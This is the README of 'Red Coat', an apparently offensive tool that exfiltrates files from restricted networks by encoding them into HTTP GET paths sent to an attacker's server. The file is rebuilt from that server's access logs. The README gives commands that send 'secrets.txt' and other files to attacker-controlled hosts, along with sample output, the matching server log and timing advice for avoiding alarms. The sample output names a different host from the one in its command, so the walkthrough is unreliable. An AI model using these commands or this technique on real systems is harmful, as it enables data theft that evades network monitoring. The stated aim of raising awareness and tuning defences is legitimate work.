# Red Coat

Red Coat is born to perform data exfiltration from those secured environments that usually block the data uploading to Internet. It has been created with the purpose to make IT professionals to be aware about data exfiltration and to tune network security solutions to make the protection of the environment more efficient.

```

@@@@@@@   @@@@@@@@  @@@@@@@    @@@@@@@   @@@@@@    @@@@@@   @@@@@@@  
@@@@@@@@  @@@@@@@@  @@@@@@@@  @@@@@@@@  @@@@@@@@  @@@@@@@@  @@@@@@@  
@@!  @@@  @@!       @@!  @@@  !@@       @@!  @@@  @@!  @@@    @@!    
!@!  @!@  !@!       !@!  @!@  !@!       !@!  @!@  !@!  @!@    !@!    
@!@!!@!   @!!!:!    @!@  !@!  !@!       @!@  !@!  @!@!@!@!    @!!    
!!@!@!    !!!!!:    !@!  !!!  !!!       !@!  !!!  !!!@!!!!    !!!    
!!: :!!   !!:       !!:  !!!  :!!       !!:  !!!  !!:  !!!    !!:    
:!:  !:!  :!:       :!:  !:!  :!:       :!:  !:!  :!:  !:!    :!:    
::   :::   :: ::::   :::: ::   ::: :::  ::::: ::  ::   :::     ::    
 :   : :  : :: ::   :: :  :    :: :: :   : :  :    :   : :     :  

Exfiltrate anything!

redcoat [-h] [-d] [-f] <file-path> [-r] <logfile> <ip-address> <datetime> <numreq> [-s] <server> [-t] <timeout>

Options:
-d <enc-path>                                     Specify the encoded file to decode.
-f <file-path>                                    Specify the file to exfiltrate.
-r <logfile> <ip-address> <datetime> <numreq>     Specify the path to logfile and the target ip address along the number of requests and the datetime to reconstruct the exfltrated file.
-s <server>                                       Specify the server where to send the file to exfiltrate.
-t <timeout>                                      Specify the number of seconds for each request.

Usage Examples:
redcoat 
redcoat -d encoded.txt
redcoat -f exfiltrate.zip -s https://attacker.com -t 10
redcoat -r /var/log/nginx/access.log 3.12.4.1 '17/Mar/2024:01:37:28 +0000' 10
```

## Usage

Red Coat reads file content as bytes and encode them as gzip and base64 to shrink data and send it to an external HTTP server. It can be also used to reconstruct the encoded data on the server side to retrieve the data inside the exfiltrated file.

The concept of the tool is to get file content as group of bytes, compressing and encoding them and sending an HTTP GET request to a target server controlled by the attacker. The attacker can retrieve this encoded information inside the access logs of its HTTP server and, by using victim client IP address, datetime and number of sent requests, can retrieve the exfiltrated decoded file content.

In particular, to reconstruct the exfiltrated file, Red Coat parses the access log file trying to detect the first HTTP GET request associated to the provided victim client IP address at a specific time, and retrieve the next HTTP GET requests (as much as the sent requests) from this victim client resulting as 404 Status Code.

## Test

Let's guess you control a server at 1.2.3.4 IP address, and you are inside a client machine with a file called `secrets.txt` to exfiltrate, containing the following data:
```
@@@@@@@   @@@@@@@@  @@@@@@@    @@@@@@@   @@@@@@    @@@@@@   @@@@@@@  
@@@@@@@@  @@@@@@@@  @@@@@@@@  @@@@@@@@  @@@@@@@@  @@@@@@@@  @@@@@@@  
@@!  @@@  @@!       @@!  @@@  !@@       @@!  @@@  @@!  @@@    @@!    
!@!  @!@  !@!       !@!  @!@  !@!       !@!  @!@  !@!  @!@    !@!    
@!@!!@!   @!!!:!    @!@  !@!  !@!       @!@  !@!  @!@!@!@!    @!!    
!!@!@!    !!!!!:    !@!  !!!  !!!       !@!  !!!  !!!@!!!!    !!!    
!!: :!!   !!:       !!:  !!!  :!!       !!:  !!!  !!:  !!!    !!:    
:!:  !:!  :!:       :!:  !:!  :!:       :!:  !:!  :!:  !:!    :!:    
::   :::   :: ::::   :::: ::   ::: :::  ::::: ::  ::   :::     ::    
 :   : :  : :: ::   :: :  :    :: :: :   : :  :    :   : :     :  
```

### Client side
Exfiltrate this file by running:
```
redcoat -f secrets.txt -s https://1.2.3.4 -t 3
```
Red Coat will split the exfiltration in different HTTP GET request each 3 seconds. The usage of `-t` argument allows to decrease the noise that could trigger an alarm on the client infrastructure side.

The output of the command appears like:
```
Number of GET requests to exfiltrate the file: 10

Exfiltrating file secrets.txt at 17/Mar/2024:19:21:35 +0000:

GET: https://hub.athenaos.org/H4sIAAAAAAAA/13JQQkAAAzDQCuREv+qBoON0r6ORneAHh/J/jIOUyj3K0UAAAA=
GET: https://hub.athenaos.org/H4sIAAAAAAAA/53GMQEAAAzDICtIiX9VO+agXNSjdRzPAg9iRQAAAA==
GET: https://hub.athenaos.org/H4sIAAAAAAAA/12LsQkAAAjDXrGf5P+rtA4V7BBCoKAqwBjbkSbjtbN8GjHLn8JFAAAA
GET: https://hub.athenaos.org/H4sIAAAAAAAA/4WJMQ0AAAyDrICT+le1rMfecREwQgy4Vvxb7f4AmEbHO0UAAAA=
GET: https://hub.athenaos.org/H4sIAAAAAAAA/1WJsQ0AMAzCXjFvdOL/q0rIFIGEZSwrBbJ6AyFD5T7XhZq1nQ8VEoaGRQAAAA==
GET: https://hub.athenaos.org/H4sIAAAAAAAA/2VJyQ0AAAxZhTX6sv9UpfEriZOUCYPBXMrgUsHbxB61BQFxANlFAAAA
GET: https://hub.athenaos.org/H4sIAAAAAAAA/1WLyQkAAAjDVmnWcP/BPAqKfYWUQChAEkXeEC39fHe0TQLGycIcRQAAAA==
GET: https://hub.athenaos.org/H4sIAAAAAAAA/4WJMQ0AAAyDrFAb+Be2rMfecREwQgy4Vvxb7f4A5cZZ60UAAAA=
GET: https://hub.athenaos.org/H4sIAAAAAAAA/0WLsQ0AAAjCXukd/f8woxJdCC1BAd3sEu6eZZzn/EeAAlXXGSZFAAAA
GET: https://hub.athenaos.org/H4sIAAAAAAAA/02IAQ0AAAjCqjwH/YMpqJuDAQcBajli0uadId53NLsA5cNvRkIAAAA=

Number of requests done: 10
```
Take a note of datetime **17/Mar/2024:19:21:35 +0000**, **Number of requests done: 10** and the **IP address** of the client machine (it can be guessed/retrieved directly on the log file of your server), let's guess it is **22.11.88.99**. This information is used to reconstruct the exfiltrated data.

Once all the requests are sent to the destination server, access to this server and check for access logs.

### Server side
Let's guess `/var/log/nginx/access.log` file appears like:
```
22.11.88.99 - - [17/Mar/2024:19:20:01 +0000] "GET /H4sIAAAAAAAA/wELAfT+KbZb2Dm/t9NZrqQIL9mk/KeoVvIC+3+i+2L3YHtPvR8Fqgx5WA0HZ4dFvHT2OQhEFdEfuj+aRbZqHE9mOEsiXdNon66lkQN/T77UvvHEdaklb1czVGoMYv0RSuBahjrPoeCojBu8Rj6NCKto2HygytlWkz9D9VWAoclf4HS8/VEbrEUXnHLeVHQoktnFvtqGNEKCaW4jaDDu0S1eZl4D8Xm/lOdvAQYAHXZkDQ1lbmRzdHJlYW0NZW5kb2JqDTIzMDMgMCBvYmoNPDwvRmlsdGVyL0ZsYXRlRGVjb2RlL0ZpcnN0IDM2L0xlbmd0aCAyMDAvTiA1L1R5cGUvT2JqU3RtPj5zdHJlYW0NIs6LkAsBAAA= HTTP/1.1" 404 153 "-" "-"
22.11.88.99 - - [17/Mar/2024:19:20:01 +0000] "GET /H4sIAAAAAAAA/wEmAdn+aN58jUsLwkAMhP9KjnoxG9+KCLWKFKmKWw8iHpYSH6jdZXct+u+tWvAiHpIZyMwXogYIIGpBr9jttyPqAHVe2oU6EWyJmkVotRsMMIgk7NXFMY5inGt7VRcMAxC1RksI0cbFsjwvljEQygC8vTHKWLlzkc8Yk4dhnNz9VHrlGVP1LWvzKQ+HxadQ4pjzU8phvJlhVGJnpUpMrMqcUZaz9PGBTq2+mXdX4noVvaZy9N64PuIpy9l5bWsHnVd/8P/wngIMAL1RV9MNZW5kc3RyZWFtDWVuZG9iag0yMzA0IDAgb2JqDTw8L0ZpbHRlci9GbGF0ZURlY29kZS9GaXJzdCA2L0xlbmd0aCAxMzYvTiAxL1R5cGUvT2JqU3RtPj5zdHJlYW0NSF/3TSYBAAA= HTTP/1.1" 404 153 "-" "-"
22.11.88.99 - - [17/Mar/2024:19:20:02 +0000] "GET /H4sIAAAAAAAA/8u4p9N7EACfrvL6BQAAAA== HTTP/1.1" 404 153 "-" "-"
22.11.88.99 - - [17/Mar/2024:19:20:02 +0000] "GET /H4sIAAAAAAAA/wHgAB//wjAQRH9lvyC729g0gRJoTy14kEbwUHrQmoMIqYTtwb83osxlHjxmmA9A0LbYAXNT6oR9KBhKzu9XxH7L95jxAuT9H2YqHi044IhTXGV2ThmuNdSVIqcrYGOVtRaMUa6xesEgeV/ldM0xCWjCsN/kO358pOfvpktpE+8/AgwAZEMn5A1lbmRzdHJlYW0NZW5kb2JqDTIzMDUgMCBvYmoNPDwvRmlsdGVyL0ZsYXRlRGVjb2RlL0ZpcnN0IDUvTGVuZ3RoIDIyNC9OIDEvVHlwZS9PYmpTdG0+PnN0cmVhbQ12jC5m4AAAAA== HTTP/1.1" 404 153 "-" "-"
22.11.88.99 - - [17/Mar/2024:19:20:02 +0000] "GET /H4sIAAAAAAAA/8u4VzLhLACg8YduBQAAAA== HTTP/1.1" 404 153 "-" "-"
22.11.88.99 - - [17/Mar/2024:19:20:02 +0000] "GET /H4sIAAAAAAAA/ztkINASr+r/QM13DQCWCFepCwAAAA== HTTP/1.1" 404 153 "-" "-"
22.11.88.99 - - [17/Mar/2024:19:20:02 +0000] "GET /H4sIAAAAAAAA/wFqAJX/UvC3J6E0uYlIrYsI2ki6Qn17t6311kNCvsxkmI2RQorlElZV5akWKprHfJHDKtDaN0c5YZ2XXsS8xyqayBOsH4jXUXXjK8KqzdKmz9oE/xq1H/B6L0bVrAicJZT61cqx9u9QYs2Vdw2llovYTrpqAAAA HTTP/1.1" 404 153 "-" "-"
5.4.3.2 - - [17/Mar/2024:19:20:07 +0000] "GET /existing-file HTTP/1.1" 200 438 "-" "pacman/6.1.0 (Linux x86_64) libalpm/14.0.0"
22.11.88.99 - - [17/Mar/2024:19:21:35 +0000] "GET /H4sIAAAAAAAA/13JQQkAAAzDQCuREv+qBoON0r6ORneAHh/J/jIOUyj3K0UAAAA= HTTP/1.1" 404 153 "-" "-"
22.11.88.99 - - [17/Mar/2024:19:21:39 +0000] "GET /H4sIAAAAAAAA/53GMQEAAAzDICtIiX9VO+agXNSjdRzPAg9iRQAAAA== HTTP/1.1" 404 153 "-" "-"
22.11.88.99 - - [17/Mar/2024:19:21:42 +0000] "GET /H4sIAAAAAAAA/12LsQkAAAjDXrGf5P+rtA4V7BBCoKAqwBjbkSbjtbN8GjHLn8JFAAAA HTTP/1.1" 404 153 "-" "-"
22.11.88.99 - - [17/Mar/2024:19:21:45 +0000] "GET /H4sIAAAAAAAA/4WJMQ0AAAyDrICT+le1rMfecREwQgy4Vvxb7f4AmEbHO0UAAAA= HTTP/1.1" 404 153 "-" "-"
22.11.88.99 - - [17/Mar/2024:19:21:48 +0000] "GET /H4sIAAAAAAAA/1WJsQ0AMAzCXjFvdOL/q0rIFIGEZSwrBbJ6AyFD5T7XhZq1nQ8VEoaGRQAAAA== HTTP/1.1" 404 153 "-" "-"
22.11.88.99 - - [17/Mar/2024:19:21:51 +0000] "GET /H4sIAAAAAAAA/2VJyQ0AAAxZhTX6sv9UpfEriZOUCYPBXMrgUsHbxB61BQFxANlFAAAA HTTP/1.1" 404 153 "-" "-"
3.6.9.1 - - [17/Mar/2024:19:21:51 +0000] "GET / HTTP/1.1" 200 378 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0"
22.11.88.99 - - [17/Mar/2024:19:21:55 +0000] "GET /H4sIAAAAAAAA/1WLyQkAAAjDVmnWcP/BPAqKfYWUQChAEkXeEC39fHe0TQLGycIcRQAAAA== HTTP/1.1" 404 153 "-" "-"
22.11.88.99 - - [17/Mar/2024:19:21:58 +0000] "GET /H4sIAAAAAAAA/4WJMQ0AAAyDrFAb+Be2rMfecREwQgy4Vvxb7f4A5cZZ60UAAAA= HTTP/1.1" 404 153 "-" "-"
22.11.88.99 - - [17/Mar/2024:19:22:01 +0000] "GET /H4sIAAAAAAAA/0WLsQ0AAAjCXukd/f8woxJdCC1BAd3sEu6eZZzn/EeAAlXXGSZFAAAA HTTP/1.1" 404 153 "-" "-"
22.11.88.99 - - [17/Mar/2024:19:22:04 +0000] "GET /H4sIAAAAAAAA/02IAQ0AAAjCqjwH/YMpqJuDAQcBajli0uadId53NLsA5cNvRkIAAAA= HTTP/1.1" 404 153 "-" "-"
```
On your server, use Red Coat to reconstruct the exfiltrated file by:
```
redcoat -r /var/log/nginx/access.log 22.11.88.99 '17/Mar/2024:19:21:35 +0000' 10
```
It will generate a file named `reconstructed_file` containing the exfiltrated file content:
```
@@@@@@@   @@@@@@@@  @@@@@@@    @@@@@@@   @@@@@@    @@@@@@   @@@@@@@  
@@@@@@@@  @@@@@@@@  @@@@@@@@  @@@@@@@@  @@@@@@@@  @@@@@@@@  @@@@@@@  
@@!  @@@  @@!       @@!  @@@  !@@       @@!  @@@  @@!  @@@    @@!    
!@!  @!@  !@!       !@!  @!@  !@!       !@!  @!@  !@!  @!@    !@!    
@!@!!@!   @!!!:!    @!@  !@!  !@!       @!@  !@!  @!@!@!@!    @!!    
!!@!@!    !!!!!:    !@!  !!!  !!!       !@!  !!!  !!!@!!!!    !!!    
!!: :!!   !!:       !!:  !!!  :!!       !!:  !!!  !!:  !!!    !!:    
:!:  !:!  :!:       :!:  !:!  :!:       :!:  !:!  :!:  !:!    :!:    
::   :::   :: ::::   :::: ::   ::: :::  ::::: ::  ::   :::     ::    
 :   : :  : :: ::   :: :  :    :: :: :   : :  :    :   : :     :  
 ```